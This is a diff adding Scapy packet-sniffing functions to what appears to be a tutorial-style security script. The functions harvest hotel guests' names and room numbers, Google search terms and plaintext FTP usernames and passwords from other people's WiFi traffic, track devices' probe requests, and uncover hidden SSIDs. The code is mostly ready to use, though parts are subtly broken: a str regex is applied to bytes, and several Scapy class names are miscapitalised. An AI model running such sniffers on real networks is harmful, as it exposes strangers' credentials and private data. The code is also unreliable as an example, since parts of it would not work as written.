@@ -1669,3 +1669,101 @@ def find_visa_card(raw):
 # authentication for WiFi AND for meals, drinks, cigars, and, well,
 # you name it. This information can be sniffed out as other guests try
 # to log into this WiFi.
+
+# conf.iface = "mon0", is the code which sets the interface
+# Then we sniff for tcp packets. Packets contain all sorts of
+# garbage, so getting skilled with regexes is a good idea.
+
+
+def find_guest(pkt):
+    raw = pkt.sprintf("%Raw.load%")
+
+    # The ?i is for matching any case insensitive character
+    # ?-i turns off case insensitive mode
+    name = re.findall("(?i)LAST_NAME=(.*)&", raw)
+    room = re.findall("(?i)ROOM_NUMBER=(.*)'", raw)
+    if name:
+        print("[+] Found hotel guest {} with Room #{}".format(name[0], room[0]))
+
+# Google most likely implements a HTTP GET request after every
+# keystroke, which can be sniffed out. A google search includes
+# q= as the query parameter (pq for previous search).
+
+
+def find_google(pkt):
+    if pkt.haslayer(Raw):
+        payload = pkt.getlayer(Raw).load
+
+        if b'GET' in payload:
+            if b'google' in payload:
+                payload_str = payload.decode("utf-8")
+                print(payload_str)
+                r = re.findall(r'(?i)\&q=(.*?)\&', payload)
+                if r:
+                    search = r[0].split('&')[0]
+                    search = search.replace('q=', '').\
+                        replace('+', ' ').replace('%20', ' ')
+                    print("[+] Searched for: {}".format(search))
+                else:
+                    print("[-] Something went wrong")
+            else:
+                print("[-] {} not in payload".format(b'google'))
+
+
+# Although this was working sometimes, it was very inconsistent (probably
+# because of encrypted wireless network).
+
+# As we've seen, sniffing is a very powerful mechanism and is very dangerous.
+# It can be also used to acquire FTP credentials. When a person logs into a
+# service, an attacker can listen and intercept these credentials if they're
+# trasmitted over a wireless network. Scapy contains the load field which can
+# catch these credentials.
+
+def ftp_sniff(pkt):
+    dest = pkt.getlayer(IP).dst
+    raw = pkt.sprintf("%Raw.load%")
+    user = re.findall("(?i)USER (.*)", raw)
+    password = re.findall("(?i)PASS (.*)", raw)
+
+    if user:
+        print("[+] FTP login to {} from user {}".format(str(dest), str(user[0])))
+    elif password:
+        print("[+] Password: {}".format(str(password[0])))
+
+
+# Scapy works in conjunction with network interfaces. You can also
+# sniff out where certain laptops have been aka the wifi networks 
+# they connect to. Phones and laptops have lists of WiFis that they
+# have connected to in the past. Computers send 802s after either
+# booting up or disconnecting from a network.
+
+saved_wifis = []
+def sniff_probe(pkt):
+    if pkt.haslayer(DOT11ProbeReq):
+        net_name = pkt.getlayer(DOT11ProbeReq).info
+        if net_name not in saved_wifis:
+            saved_wifis.append(net_name)
+            print("[+] Detected new probe request: {}".format(net_name))
+
+# Some networks hide their SSID's to avoid having it be discovered.
+# Usually 802.11 Beacon Frames contain the name of the network, but 
+# on networks which have their ID's hidden, this field is left blank.
+
+hidden_networks = []
+unhidden_networks = []
+def sniff_dot_11(p):
+    if p.haslayer(Dot11Beacon).info == '':
+        addr2 = p.getlayer(Dot11).addr2 
+        if addr2 not in hidden_networks:
+            print("[-] Hidden SSID with mac: {}".format(addr2))
+            hidden_networks.append(addr2)
+
+    if p.haslayer(DOT11ProbeResp):
+        addr2 = p.getlayer(Dot11).addr2 
+        if (addr2 in hidden_networks) & (addr2 not in unhidden_networks):
+            net_name = p.getlayer(Dot11ProbeResp).info 
+            print("[+] Decloaked Hidden SSID: {} for MAC: {}".format(net_name, addr2))
+
+# We know the mac address of the access points, but still we don't know
+# anything about the SSID name. To discover the hidden names, we must 
+# wait for probe responses which match the earlier mac address.
